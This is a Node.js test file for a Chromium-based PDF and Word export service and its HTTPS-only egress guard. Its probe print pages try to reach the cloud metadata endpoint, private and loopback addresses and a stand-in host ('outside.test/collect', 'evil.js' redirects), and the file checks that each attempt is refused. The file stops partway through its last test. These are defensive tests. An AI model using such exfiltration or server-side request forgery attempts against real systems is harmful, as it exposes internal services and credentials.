// The export renderer (ops I-1313): its HTTP app with a fake renderer, the egress guard's HTTPS-only mode, then
// the real renderer in headless Chromium against a stand-in print page (test/fixtures/export-print.html) served on
// loopback, the one origin the guard trusts.
//
// Test network, as in render-guard.test.mjs: "outside.test" stands for a public site the print does not need.
// Its lookup answers a public address, and connections to it go to a local server that counts what reaches it.
// "rebind.test" resolves to 127.0.0.1. Every other name and address is resolved and connected for real, so a
// "secret" server on another loopback port is reached if the guard lets anything through.

import { after, before, describe, test } from 'node:test';
import assert from 'node:assert/strict';
import dns from 'node:dns/promises';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import * as pdfjs from 'pdfjs-dist/legacy/build/pdf.mjs';
import { strFromU8, unzipSync } from 'fflate';
import { GuardedBrowser } from '../guarded-browser.mjs';
import { startEgressProxy, trustedOriginKeys } from '../egress-guard.mjs';
import { createExportApp, documentProblem } from '../export-app.mjs';
import {
  DOCX_MAGIC, DOCX_TYPE, rightToLeftTables, WordConverter, WordFailed,
} from '../export-docx.mjs';
import {
  createExportRenderer, exportRequestAllowed, ExportBusy, ExportFailed, ExportTimeout, printOrigin, printPageUrl,
} from '../export-renderer.mjs';

const KEY = 'test-export-key-0123456789';
const FAKE_PUBLIC = '93.184.216.34';
const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const PRINT_PAGE = fs.readFileSync(path.join(ROOT, 'test/fixtures/export-print.html'), 'utf8');
const KATEX_DIR = path.join(ROOT, 'node_modules/katex/dist');

function collectingLog() {
  const lines = [];
  const push = (...a) => lines.push(a.join(' '));
  return { lines, log: { info: push, warn: push, error: push, log: push } };
}

function listen(server) {
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server.address().port)));
}

/** Every page's text runs, in the order the PDF draws them, joined by `separator`. */
async function pdfText(buffer, separator = '') {
  const task = pdfjs.getDocument({ data: new Uint8Array(buffer), isEvalSupported: false });
  const pdf = await task.promise;
  const pages = [];
  for (let n = 1; n <= pdf.numPages; n += 1) {
    const content = await (await pdf.getPage(n)).getTextContent();
    pages.push(content.items.map((item) => item.str).join(separator));
  }
  await task.destroy();
  return pages.join('\n');
}

// Compared without spaces and in compatibility form, so line breaks and Arabic presentation forms (the shaped
// letters a PDF may name) match the text the student saw.
const squash = (text) => text.normalize('NFKC').replace(/\s+/g, '');

// A right-to-left line's words come out of a PDF in drawing order (left to right on the page), and Chromium's
// text layer names the two letters of a lam ligature (لأ, لم) the other way round, so a copied word can read
// "األساسية" for "الأساسية" though the page shows it right. An Arabic paragraph is held when each of its words is
// in the text with the same letters: a word's key is its letters, sorted.
const words = (text) => text.normalize('NFKC').split(/[\s.,:;!?()"'\u060C\u061B\u061F]+/u).filter(Boolean);
const letterKey = (word) => [...word].sort().join('');

/** The words of `paragraph` missing from `text` (as letter keys, each used once). */
function missingWords(paragraph, text) {
  const pool = new Map();
  for (const word of words(text)) pool.set(letterKey(word), (pool.get(letterKey(word)) || 0) + 1);
  return words(paragraph).filter((word) => {
    const key = letterKey(word);
    if (!pool.get(key)) return true;
    pool.set(key, pool.get(key) - 1);
    return false;
  });
}

/** A Word file's main text (word/document.xml) and the names of the pictures in it. */
function docxParts(buffer) {
  const files = unzipSync(new Uint8Array(buffer));
  return {
    xml: strFromU8(files['word/document.xml']),
    media: Object.keys(files).filter((name) => name.startsWith('word/media/')),
  };
}

/** The paragraphs (<w:p>) of a Word file's main text, each as its XML. */
const docxParagraphs = (xml) => xml.split(/(?=<w:p>|<w:p )/).slice(1).map((p) => p.split('</w:p>')[0]);
/** A paragraph's text, from its runs. */
const paragraphText = (p) => [...p.matchAll(/<w:t(?: [^>]*)?>([^<]*)<\/w:t>/g)].map((m) => m[1]).join('');

const DOC = {
  title: 'Cell biology',
  language: 'en',
  outputs: [{ kind: 'answer', title: null, chunks: [{ type: 'response', content: 'Mitochondria make ATP.' }] }],
};

const ENGLISH = [
  'Photosynthesis turns light into chemical energy in the chloroplast.',
  'The roots of a quadratic are $x = \\frac{-b \\pm \\sqrt{b^2 - 4ac}}{2a}$ for any real coefficients.',
  'Mass and energy are linked:',
  '$$E = mc^2$$',
  'Each paragraph of the answer must reach the page, the last one included.',
];

const ARABIC = [
  'الخلية هي الوحدة الأساسية للحياة في جميع الكائنات الحية.',
  'تنتج الميتوكوندريا الطاقة على شكل جزيئات ATP داخل الخلية.',
  'تحتوي النواة على المادة الوراثية التي تتحكم في نشاط الخلية.',
];

// What the web app's Markdown draws for a cheat sheet's other parts, a drawn timeline (a diagram the page draws in
// place of a picture), a picture, and a control the page hides.
const PIXEL = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
const WORD_PARTS = `<h2>Units</h2>
<table><thead><tr><th>Quantity</th><th>Unit</th></tr></thead><tbody><tr><td>Velocity</td><td>m/s</td></tr></tbody></table>
<ul><li>Speed is a scalar.</li><li>Velocity is a vector.</li></ul>
<pre><code>v = d / t</code></pre>
<figure class="timeline"><div style="padding:8px;border:1px solid #999">1687: Newton's Principia</div>
<div style="padding:8px;border:1px solid #999">1905: Special relativity</div></figure>
<p><img src="${PIXEL}" width="40" height="40" alt=""></p>
<div><button class="print-visible"><img src="${PIXEL}" width="48" height="27" alt="A picture the chat opens in a viewer"></button>
<button>Copy</button></div>
<div style="display:none">Hidden control</div>`;

describe('documentProblem', () => {
  test('accepts a document of outputs', () => {
    assert.equal(documentProblem({ document: DOC }), null);
  });
  test('refuses a URL in place of outputs, unknown kinds, empty lists and chunks with no type', () => {
    assert.match(documentProblem({ url: 'http://169.254.169.254/' }), /document/);
    assert.match(documentProblem({ document: { ...DOC, outputs: [] } }), /outputs/);
    assert.match(documentProblem({ document: { ...DOC, outputs: [{ kind: 'html', chunks: [] }] } }), /kind/);
    assert.match(documentProblem({ document: { ...DOC, outputs: [{ kind: 'answer', chunks: ['<b>x</b>'] }] } }), /chunk/);
    assert.match(documentProblem({ document: { ...DOC, title: 'x'.repeat(301) } }), /title/);
    assert.match(documentProblem({ document: { ...DOC, direction: 'up' } }), /direction/);
  });
});

describe('printPageUrl, printOrigin and exportRequestAllowed', () => {
  test('appends a language tag, English for anything else', () => {
    assert.equal(printPageUrl('https://app.youlearn.ai/export-print/', 'ar'), 'https://app.youlearn.ai/export-print/ar');
    assert.equal(printPageUrl('https://app.youlearn.ai/export-print', '../../x'), 'https://app.youlearn.ai/export-print/en');
    assert.equal(printPageUrl('https://app.youlearn.ai/export-print?x=1', 'pt-BR'), 'https://app.youlearn.ai/export-print/pt-BR');
  });
  test('names loopback print pages', () => {
    assert.equal(printOrigin('http://localhost:3000/export-print').loopback, true);
    assert.equal(printOrigin('http://localhost:3000/export-print').port, 3000);
    assert.equal(printOrigin('https://app.youlearn.ai/export-print').loopback, false);
    assert.equal(printOrigin('file:///etc/passwd'), null);
  });
  test('the page may load its own origin and HTTPS images, nothing else', () => {
    const origin = 'https://app.youlearn.ai';
    const allowed = (url, resourceType) => exportRequestAllowed({ url, resourceType }, origin);
    assert.equal(allowed('https://app.youlearn.ai/_next/static/app.js', 'script'), true);
    assert.equal(allowed('https://cdn.example.org/cell.png', 'image'), true);
    assert.equal(allowed('https://cdn.example.org/track', 'fetch'), false);
    assert.equal(allowed('https://cdn.example.org/a.js', 'script'), false);
    assert.equal(allowed('https://cdn.example.org/f.woff2', 'font'), false);
    assert.equal(allowed('https://cdn.example.org/', 'document'), false);
    assert.equal(allowed('http://cdn.example.org/cell.png', 'image'), false);
    assert.equal(allowed('https://cdn.example.org:8443/cell.png', 'image'), false);
    assert.equal(allowed('https://app.youlearn.ai.evil.test/x.js', 'script'), false);
    assert.equal(allowed('not a url', 'image'), false);
  });
});

describe('export app', () => {
  let server;
  let port;
  const calls = [];
  let behaviour = 'ok';

  async function post(body, headers = { 'x-api-key': KEY }, format = 'pdf') {
    const response = await fetch(`http://127.0.0.1:${port}/render-${format}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...headers },
      body: JSON.stringify(body),
    });
    const type = response.headers.get('content-type') || '';
    return {
      status: response.status,
      headers: response.headers,
      body: type.includes('application/json') ? await response.json() : Buffer.from(await response.arrayBuffer()),
    };
  }

  before(async () => {
    const { log } = collectingLog();
    const app = createExportApp({
      key: KEY,
      log,
      render: async (doc, format) => {
        calls.push({ doc, format });
        if (behaviour === 'busy') throw new ExportBusy();
        if (behaviour === 'timeout') throw new ExportTimeout(10);
        if (behaviour === 'failed') throw new ExportFailed('draw', 'page_failed');
        const file = format === 'docx' ? Buffer.concat([DOCX_MAGIC, Buffer.from('test')]) : Buffer.from('%PDF-1.7 test');
        return { file, diagrams: 2, imagesFailed: 0, blocked: 1, ms: 5 };
      },
    });
    server = http.createServer(app);
    port = await listen(server);
  });
  after(() => server.close());

  test('refuses a request without the key, or with a wrong one, before rendering', async () => {
    const before = calls.length;
    assert.equal((await post({ document: DOC }, {})).status, 401);
    assert.equal((await post({ document: DOC }, { 'x-api-key': 'wrong' })).status, 401);
    assert.equal(calls.length, before);
  });

  test('refuses everything when no key is configured', async () => {
    const { log } = collectingLog();
    const open = http.createServer(createExportApp({ key: '', log, render: async () => assert.fail('rendered') }));
    const openPort = await listen(open);
    try {
      const response = await fetch(`http://127.0.0.1:${openPort}/render-pdf`, {
        method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ document: DOC }),
      });
      assert.equal(response.status, 503);
    } finally {
      open.close();
    }
  });

  test('answers the PDF bytes, uncached, with counts in headers', async () => {
    behaviour = 'ok';
    const answer = await post({ document: DOC });
    assert.equal(answer.status, 200);
    assert.equal(answer.headers.get('content-type'), 'application/pdf');
    assert.equal(answer.headers.get('cache-control'), 'no-store');
    assert.equal(answer.body.toString(), '%PDF-1.7 test');
    assert.equal(answer.headers.get('x-export-diagrams'), '2');
    assert.equal(answer.headers.get('x-export-blocked'), '1');
    assert.equal(calls.at(-1).format, 'pdf');
  });

  test('answers a Word file of the same document on /render-docx', async () => {
    behaviour = 'ok';
    const answer = await post({ document: DOC }, { 'x-api-key': KEY }, 'docx');
    assert.equal(answer.status, 200);
    assert.equal(answer.headers.get('content-type'), DOCX_TYPE);
    assert.equal(answer.headers.get('cache-control'), 'no-store');
    assert.ok(answer.body.subarray(0, 4).equals(DOCX_MAGIC));
    assert.deepEqual(calls.at(-1), { doc: DOC, format: 'docx' });
    assert.equal((await post({ document: DOC }, {}, 'docx')).status, 401);
  });

  test('a bad document is 400 and never renders', async () => {
    const before = calls.length;
    assert.equal((await post({ url: 'http://127.0.0.1:1/' })).status, 400);
    assert.equal(calls.length, before);
  });

  test('busy, timeout and failure map to 503, 504 and 500 with codes only', async () => {
    behaviour = 'busy';
    const busy = await post({ document: DOC });
    assert.equal(busy.status, 503);
    assert.equal(busy.headers.get('retry-after'), '5');
    behaviour = 'timeout';
    const late = await post({ document: DOC });
    assert.equal(late.status, 504);
    assert.equal(late.body.code, 'deadline');
    behaviour = 'failed';
    const failed = await post({ document: DOC });
    assert.equal(failed.status, 500);
    assert.deepEqual(failed.body, { success: false, error: 'Export failed', stage: 'draw', code: 'page_failed' });
  });
});

// A fake public site: counts the connections that reach it and the plain HTTP requests among them (a TLS
// handshake starts with byte 0x16).
function countingServer() {
  const seen = { connections: 0, plainRequests: 0 };
  const server = net.createServer((socket) => {
    seen.connections += 1;
    socket.on('error', () => {});
    socket.once('data', (data) => {
      if (data[0] !== 0x16) seen.plainRequests += 1;
      socket.end('HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n');
    });
  });
  return { server, seen };
}

function fakeNetwork(outsidePort) {
  const lookup = async (host) => {
    if (host === 'outside.test') return [{ address: FAKE_PUBLIC, family: 4 }];
    if (host === 'rebind.test') return [{ address: '127.0.0.1', family: 4 }];
    return dns.lookup(host, { all: true, verbatim: true });
  };
  // Connections to outside.test go to the local counting server; the socket reports the public address it
  // stands for, so the guard's own peer check runs unchanged.
  const connect = (options) => {
    if (options.host !== 'outside.test') return net.connect(options);
    const socket = net.connect({ host: '127.0.0.1', port: outsidePort() });
    Object.defineProperty(socket, 'remoteAddress', { get: () => FAKE_PUBLIC });
    return socket;
  };
  return { lookup, connect };
}

describe('the egress guard, HTTPS-only (the export service)', () => {
  let page;
  let pagePort;
  let outside;
  let outsidePort;
  let secret;
  let secretPort;
  let secretHits = 0;
  let proxy;
  const guardLog = collectingLog();

  before(async () => {
    page = http.createServer((_req, res) => res.end('page'));
    pagePort = await listen(page);
    outside = countingServer();
    outsidePort = await listen(outside.server);
    secret = http.createServer((_req, res) => { secretHits += 1; res.end('secret'); });
    secretPort = await listen(secret);
    proxy = await startEgressProxy({
      ...fakeNetwork(() => outsidePort),
      log: guardLog.log,
      logHosts: false,
      httpsOnly: true,
      trusted: [{ host: '127.0.0.1', port: pagePort }],
    });
  });
  after(async () => {
    await proxy.close();
    page.close();
    outside.server.close();
    secret.close();
  });

  const get = (target) => new Promise((resolve) => {
    const req = http.request({ host: '127.0.0.1', port: proxy.port, method: 'GET', path: target }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => resolve({ status: res.statusCode, body }));
    });
    req.on('error', () => resolve({ status: 0 }));
    req.end();
  });

  const tunnel = (target) => new Promise((resolve) => {
    const req = http.request({ host: '127.0.0.1', port: proxy.port, method: 'CONNECT', path: target });
    req.on('connect', (res, socket) => {
      socket.destroy();
      resolve(res.statusCode);
    });
    req.on('error', () => resolve(0));
    req.end();
  });

  test('trusted origin keys are an exact host and port', () => {
    const keys = trustedOriginKeys([{ host: 'LocalHost', port: 3000 }]);
    assert.ok(keys.has('localhost:3000'));
    assert.ok(!keys.has('localhost:3001'));
  });

  test('the trusted print origin is reached; another port on the same host is refused', async () => {
    assert.deepEqual(await get(`http://127.0.0.1:${pagePort}/`), { status: 200, body: 'page' });
    assert.equal((await get(`http://127.0.0.1:${secretPort}/`)).status, 403);
    assert.equal((await get(`http://localhost:${pagePort}/`)).status, 403);
    assert.equal(await tunnel(`127.0.0.1:${secretPort}`), 403);
    assert.equal(secretHits, 0);
  });

  test('internal addresses are refused on port 443 too', async () => {
    for (const target of [
      '127.0.0.1:443', '[::1]:443', '0.0.0.0:443', 'rebind.test:443', '169.254.169.254:443', 'metadata.google.internal:443',
      '10.0.0.1:443', '172.16.0.1:443', '192.168.1.1:443', '[fd00::1]:443', '[::ffff:127.0.0.1]:443',
    ]) {
      assert.equal(await tunnel(target), 403, target);
    }
  });

  test('an outside address is reached only over HTTPS on port 443', async () => {
    const before = { ...outside.seen };
    assert.equal((await get('http://outside.test/collect')).status, 403);
    assert.equal(await tunnel('outside.test:80'), 403);
    assert.equal(await tunnel('outside.test:8443'), 403);
    assert.equal(outside.seen.connections, before.connections);
    assert.equal(await tunnel('outside.test:443'), 200);
    assert.equal(outside.seen.connections, before.connections + 1);
    assert.equal(outside.seen.plainRequests, before.plainRequests);
  });

  test('refusal lines name a reason and no host', () => {
    const refusals = guardLog.lines.filter((l) => l.startsWith('[EGRESS_REFUSED]'));
    assert.ok(refusals.some((l) => l.includes('reason=port')));
    assert.ok(refusals.some((l) => l.includes('reason=scheme')));
    assert.ok(refusals.every((l) => l.endsWith('host=-')), refusals.join('\n'));
  });
});

// A print page that, besides drawing, tries to reach what a print never needs: the metadata server, a private
// address, a name that resolves to loopback, another loopback port (plain, HTTPS and WebSocket), and an outside
// site by fetch, script, frame, font and plain-http image. It reports what each attempt saw.
function probePage(secretPort) {
  return `<!doctype html><html><head><meta charset="utf-8"></head><body><main id="doc"></main><script>
    const attempt = (fn) => fn().then(() => 'reached', () => 'refused');
    const img = (src) => new Promise((resolve) => {
      const i = new Image(); i.onload = () => resolve('reached'); i.onerror = () => resolve('refused'); i.src = src;
    });
    const ws = (url) => new Promise((resolve) => {
      const s = new WebSocket(url); s.onopen = () => resolve('reached'); s.onerror = s.onclose = () => resolve('refused');
    });
    const frame = (src) => new Promise((resolve) => {
      const f = document.createElement('iframe'); f.onload = () => resolve('loaded'); f.src = src;
      document.body.append(f); setTimeout(() => resolve('timeout'), 3000);
    });
    window.__youlearnExportRender = async (doc) => {
      document.getElementById('doc').textContent = doc.outputs[0].chunks[0].content;
      const results = {
        metadata: await img('https://169.254.169.254/latest/meta-data.png'),
        private: await img('https://10.0.0.1/x.png'),
        rebind: await img('https://rebind.test/x.png'),
        loopbackHttp: await img('http://127.0.0.1:${secretPort}/leak.png'),
        loopbackHttps: await img('https://127.0.0.1:${secretPort}/leak.png'),
        loopbackWs: await ws('ws://127.0.0.1:${secretPort}/'),
        outsideFetch: await attempt(() => fetch('https://outside.test/collect', { method: 'POST', body: 'x', mode: 'no-cors' })),
        outsideScript: await attempt(() => new Promise((res, rej) => {
          const s = document.createElement('script'); s.onload = res; s.onerror = rej; s.src = 'https://outside.test/x.js';
          document.head.append(s);
        })),
        outsideFrame: await frame('https://outside.test/'),
        outsidePlainImage: await img('http://outside.test/x.png'),
        outsideFont: await attempt(() => new FontFace('X', 'url(https://outside.test/f.woff2)').load()),
      };
      await fetch('/probe-results', { method: 'POST', body: JSON.stringify(results) });
      return { diagrams: 0, imagesFailed: 0 };
    };
  </script></body></html>`;
}

// A print page whose own-origin requests (a script, a fetch, an image) answer with a redirect to somewhere a print
// may not go: an outside site over HTTPS on 443, and another loopback port. It reports what each attempt saw.
const REDIRECT_PAGE = `<!doctype html><html><head><meta charset="utf-8"></head><body><main id="doc"></main><script>
  const settle = (el, src) => new Promise((resolve) => {
    el.onload = () => resolve('reached'); el.onerror = () => resolve('refused'); el.src = src;
    if (el.tagName === 'SCRIPT') document.head.append(el);
  });
  window.__youlearnExportRender = async (doc) => {
    document.getElementById('doc').textContent = doc.outputs[0].chunks[0].content;
    const results = {
      script: await settle(document.createElement('script'), '/go-out.js'),
      fetched: await fetch('/go-out-fetch').then(() => 'reached', () => 'refused'),
      image: await settle(new Image(), '/img-out.png'),
    };
    await fetch('/probe-results', { method: 'POST', body: JSON.stringify(results) });
    return { diagrams: 0, imagesFailed: 0 };
  };
</script></body></html>`;

describe('export renderer in Chromium', { timeout: 180_000 }, () => {
  let browser;
  let page;
  let pagePort;
  let secret;
  let secretPort;
  let secretHits = 0;
  let outside;
  let outsidePort;
  let probeResults = null;
  const requested = [];
  const guardLog = collectingLog();

  before(async () => {
    secret = http.createServer((_req, res) => { secretHits += 1; res.end('secret'); });
    secret.on('upgrade', (_req, socket) => { secretHits += 1; socket.destroy(); });
    secretPort = await listen(secret);
    outside = countingServer();
    outsidePort = await listen(outside.server);
    page = http.createServer((req, res) => {
      requested.push(req.url);
      if (req.url === '/probe-results') {
        let body = '';
        req.on('data', (c) => { body += c; });
        req.on('end', () => { probeResults = JSON.parse(body); res.end(); });
        return;
      }
      if (req.url.startsWith('/assets/katex/')) {
        const file = path.join(KATEX_DIR, path.normalize(req.url.slice('/assets/katex/'.length)).replace(/^(\.\.[/\\])+/, ''));
        const types = { '.css': 'text/css', '.js': 'text/javascript', '.woff2': 'font/woff2' };
        if (!fs.existsSync(file)) return res.writeHead(404).end();
        res.setHeader('content-type', types[path.extname(file)] || 'application/octet-stream');
        return res.end(fs.readFileSync(file));
      }
      const redirects = {
        '/go-out.js': 'https://outside.test/evil.js',
        '/go-out-fetch': 'https://outside.test/collect',
        '/img-out.png': `http://127.0.0.1:${secretPort}/leak.png`,
      };
      if (redirects[req.url]) return res.writeHead(302, { location: redirects[req.url] }).end();
      res.setHeader('content-type', 'text/html; charset=utf-8');
      if (req.url.startsWith('/redirect/')) return res.end(REDIRECT_PAGE);
      if (req.url.startsWith('/probe/')) return res.end(probePage(secretPort));
      if (req.url.startsWith('/hang/')) return undefined; // never answers
      return res.end(PRINT_PAGE);
    });
    pagePort = await listen(page);
    browser = new GuardedBrowser({
      killable: true,
      log: guardLog.log,
      guard: {
        ...fakeNetwork(() => outsidePort),
        log: guardLog.log,
        logHosts: false,
        httpsOnly: true,
        trusted: [{ host: '127.0.0.1', port: pagePort }],
      },
    });
  });
  after(async () => {
    await Promise.all([browser.close(), word.close()]);
    page.closeAllConnections?.();
    page.close();
    secret.close();
    outside.server.close();
  });

  const word = new WordConverter();
  const renderer = (pathname, log, options) => createExportRenderer(browser, {
    printUrl: `http://127.0.0.1:${pagePort}${pathname}`, log, options, word,
  });

  test('an English answer with math and a diagram: every paragraph is in the PDF text', async () => {
    const { log, lines } = collectingLog();
    const doc = {
      title: 'Photosynthesis and the quadratic formula',
      language: 'en',
      outputs: [{
        kind: 'answer',
        title: null,
        chunks: [
          { type: 'response', content: ENGLISH.join('\n\n') },
          { type: 'whiteboard', content: 'Sunlight -> Chloroplast -> Glucose' },
        ],
      }],
    };
    const result = await renderer('/export-print', log)(doc);
    assert.equal(result.file.subarray(0, 5).toString(), '%PDF-');
    assert.equal(result.diagrams, 1);
    assert.equal(requested.filter((u) => u === '/export-print/en').length, 1);
    // The print page's own assets (KaTeX's style, script and fonts) come from its origin and are let through.
    for (const asset of ['/assets/katex/katex.min.css', '/assets/katex/katex.min.js', '/assets/katex/contrib/auto-render.min.js']) {
      assert.ok(requested.includes(asset), asset);
    }
    assert.ok(requested.some((u) => /^\/assets\/katex\/fonts\/KaTeX_[\w-]+\.woff2$/.test(u)), requested.join('\n'));
    assert.equal(result.blocked, 0);
    const text = squash(await pdfText(result.file));
    // The prose of every paragraph, the math as KaTeX drew it, and the diagram's labels.
    for (const paragraph of ENGLISH) {
      const prose = paragraph.replace(/\$\$[^$]*\$\$|\$[^$]*\$/g, ' ').trim();
      if (prose) for (const part of prose.split(/\s{2,}/)) assert.ok(text.includes(squash(part)), part);
    }
    assert.ok(text.includes('E=mc2'), 'display math');
    // KaTeX's glyphs, in the order it draws them (a fraction's numerator after its bar).
    for (const glyphs of ['x=', '−b±', '4ac', '2a']) assert.ok(text.includes(glyphs), `inline math ${glyphs}: ${text}`);
    for (const label of ['Sunlight', 'Chloroplast', 'Glucose']) assert.ok(text.includes(label), label);
    // Codes, counts and times only: neither the title nor the text reaches a log line.
    const ok = lines.find((l) => l.startsWith('[EXPORT] ok format=pdf outputs=1 diagrams=1 images_failed=0 blocked=0'));
    assert.ok(ok, lines.join('\n'));
    assert.ok(lines.every((l) => !l.includes('Photosynthesis') && !l.includes('Sunlight')));
  });

  test('an Arabic answer: every paragraph is in the PDF text, right to left', async () => {
    const { log, lines } = collectingLog();
    const doc = {
      title: 'الخلية',
      language: 'ar',
      direction: 'rtl',
      outputs: [{ kind: 'answer', title: null, chunks: [{ type: 'response', content: ARABIC.join('\n\n') }] }],
    };
    const result = await renderer('/export-print', log)(doc);
    assert.ok(requested.includes('/export-print/ar'));
    const text = await pdfText(result.file, ' ');
    for (const paragraph of ARABIC) assert.deepEqual(missingWords(paragraph, text), [], paragraph);
    // The words of one line come in reverse (drawing order is left to right), the proof the line runs right to left.
    const firstLine = words(ARABIC[0]);
    const drawn = words(text);
    const start = drawn.findIndex((w) => letterKey(w) === letterKey(firstLine.at(-1)));
    assert.deepEqual(drawn.slice(start, start + firstLine.length).map(letterKey), firstLine.toReversed().map(letterKey));
    assert.ok(lines.every((l) => !l.includes('الخلية')));
  });

  test('a page that refuses to draw is ExportFailed, and its message reaches no log', async () => {
    const { log, lines } = collectingLog();
    const doc = { ...DOC, title: 'fail', outputs: [{ kind: 'answer', chunks: [{ type: 'response', content: 'private notes' }] }] };
    await assert.rejects(renderer('/export-print', log)(doc), (e) => e instanceof ExportFailed && e.code === 'page_failed');
    assert.ok(lines.some((l) => l.startsWith('[EXPORT] failed format=pdf stage=draw code=page_failed')));
    assert.ok(lines.every((l) => !l.includes('private notes')));
  });

  test('the page reaches nothing internal and nothing outside a print needs', async () => {
    const { log } = collectingLog();
    // The probe page posts its results to its own origin, the one place it may write to.
    const doc = { ...DOC, outputs: [{ kind: 'answer', chunks: [{ type: 'response', content: 'probe' }] }] };
    const render = renderer('/probe', log);
    const before = { ...outside.seen };
    const result = await render(doc);
    assert.equal(result.file.subarray(0, 5).toString(), '%PDF-');
    // What each attempt saw in the page (the frame's load event fires for an error page too, so the counts
    // below decide it).
    const { outsideFrame, ...attempts } = probeResults;
    assert.ok(['loaded', 'timeout'].includes(outsideFrame));
    for (const [name, seen] of Object.entries(attempts)) assert.equal(seen, 'refused', name);
    assert.equal(secretHits, 0, 'a loopback port other than the print page was reached');
    assert.equal(outside.seen.plainRequests, before.plainRequests, 'an outside site got a request');
    // Fetch, script, frame, font and the plain-http image are stopped in the browser; the WebSocket is closed
    // there too. The HTTPS images go to the guard, which refuses the internal ones.
    assert.ok(result.blocked >= 6, `blocked=${result.blocked}`);
    const refusals = guardLog.lines.filter((l) => l.startsWith('[EGRESS_REFUSED]'));
    for (const reason of ['metadata', 'private', 'loopback']) {
      assert.ok(refusals.some((l) => l.includes(`reason=${reason}`)), `${reason}: ${refusals.join('\n')}`);
    }
    assert.ok(refusals.every((l) => l.endsWith('host=-')));
  });

  test('a request from the print page origin is never redirected to another origin', async () => {
    const { log } = collectingLog();
    const doc = { ...DOC, outputs: [{ kind: 'answer', chunks: [{ type: 'response', content: 'redirects' }] }] };
    const before = { ...outside.seen };
    const hits = secretHits;
    const result = await renderer('/redirect', log)(doc);
    assert.equal(result.file.subarray(0, 5).toString(), '%PDF-');
    for (const asked of ['/go-out.js', '/go-out-fetch', '/img-out.png']) assert.ok(requested.includes(asked), asked);
    // The script and the fetch are fetched with no redirect followed; the image's redirect is followed by the
    // browser and refused by the egress guard (plain http to another loopback port).
    assert.deepEqual(probeResults, { script: 'refused', fetched: 'refused', image: 'refused' });
    assert.equal(result.blocked, 2, 'the script and fetch redirects are counted as blocked');
    assert.equal(outside.seen.connections, before.connections, 'a redirect reached an outside site');
    assert.equal(secretHits, hits, 'a redirect reached another loopback port');
  });

  test('the print page and its own requests go through the egress guard too', async () => {
    // A print page on a loopback port the guard does not trust: fetched by the renderer, it must still be refused.
    const { log } = collectingLog();
    const hits = secretHits;
    const untrusted = createExportRenderer(browser, {
      printUrl: `http://127.0.0.1:${secretPort}/export-print`, log, options: { gotoTimeoutMs: 1500 },
    });
    await assert.rejects(untrusted(DOC), (e) => e instanceof ExportFailed && e.stage === 'load');
    assert.equal(secretHits, hits);
  });

  test('a Word file of the same parts: equations, tables, lists, headings, code and every picture', async () => {
    const { log, lines } = collectingLog();
    const doc = {
      title: 'Kinematics sheet',
      language: 'en',
      outputs: [{
        kind: 'answer',
        title: null,
        chunks: [
          { type: 'response', content: ENGLISH.join('\n\n') },
          { type: 'fixture-html', content: WORD_PARTS },
          { type: 'whiteboard', content: 'Sunlight -> Chloroplast -> Glucose' },
        ],
      }],
    };
    const result = await renderer('/export-print', log)(doc, 'docx');
    assert.ok(result.file.subarray(0, 4).equals(DOCX_MAGIC));
    assert.equal(result.diagrams, 1);
    assert.equal(result.imagesFailed, 0);
    const { xml, media } = docxParts(result.file);
    const paragraphs = docxParagraphs(xml).map(paragraphText);
    const text = squash(paragraphs.join(' '));
    for (const paragraph of ENGLISH) {
      const prose = paragraph.replace(/\$\$[^$]*\$\$|\$[^$]*\$/g, ' ').trim();
      if (prose) for (const part of prose.split(/\s{2,}/)) assert.ok(text.includes(squash(part)), part);
    }
    // Math as Word equations from KaTeX's TeX: the quadratic formula (a fraction and a root) inline, E = mc² shown.
    assert.ok((xml.match(/<m:oMath>/g) || []).length >= 2, 'equations');
    assert.ok(xml.includes('<m:oMathPara>'), 'a display equation');
    assert.ok(xml.includes('<m:f>') && xml.includes('<m:rad>'), 'fraction and root');
    // A table stays a table, with a grid as the chat draws it; a list a list, a heading a heading, code its text.
    assert.equal((xml.match(/<w:tbl>/g) || []).length, 1);
    assert.ok(!xml.includes('<w:bidiVisual'), 'an English table stays left to right');
    const styles = strFromU8(unzipSync(new Uint8Array(result.file))['word/styles.xml']);
    const tableStyle = styles.slice(styles.indexOf('w:styleId="Table"'));
    assert.match(tableStyle.slice(0, tableStyle.indexOf('</w:style>')), /<w:tblBorders>\s*<w:top [^>]*w:val="single"/);
    for (const cell of ['Quantity', 'Unit', 'Velocity', 'm/s']) assert.ok(paragraphs.includes(cell), cell);
    assert.ok(xml.includes('<w:numPr>'), 'list numbering');
    assert.ok(/w:val="Heading2"/.test(xml), 'heading');
    assert.ok(text.includes(squash('v = d / t')), 'code');
    // Pictures: the SVG diagram, the drawn timeline, the image and the image the chat draws as a button (an image
    // whiteboard), each captured from the page and each placed in the text; the page's controls are left out.
    assert.equal(media.length, 4, media.join(', '));
    assert.equal((xml.match(/<a:blip r:embed=/g) || []).length, 4, 'every picture is placed in the text');
    assert.ok(!text.includes('Hiddencontrol') && !paragraphs.includes('Copy'));
    // Codes, counts and times only.
    assert.ok(lines.some((l) => l.startsWith('[EXPORT] ok format=docx outputs=1 diagrams=1 images_failed=0')), lines.join('\n'));
    assert.ok(lines.every((l) => !l.includes('Photosynthesis') && !l.includes('Kinematics')));
  });

  test('a Word file of an Arabic answer: its paragraphs and list run right to left, an English one left to right', async () => {
    const { log } = collectingLog();
    const doc = {
      title: 'الخلية',
      language: 'ar',
      direction: 'rtl',
      outputs: [{
        kind: 'answer',
        title: null,
        chunks: [
          { type: 'response', content: [...ARABIC, 'Mitochondria make ATP.'].join('\n\n') },
          { type: 'fixture-html', content: '<ol dir="auto"><li>النواة</li><li>الغشاء</li></ol>' },
          {
            type: 'fixture-html',
            content: '<div dir="auto"><table><thead><tr><th>العضية</th><th>الوظيفة</th></tr></thead>'
              + '<tbody><tr><td>النواة</td><td>تحمل المادة الوراثية</td></tr></tbody></table></div>',
          },
        ],
      }],
    };
    const result = await renderer('/export-print', log)(doc, 'docx');
    const { xml } = docxParts(result.file);
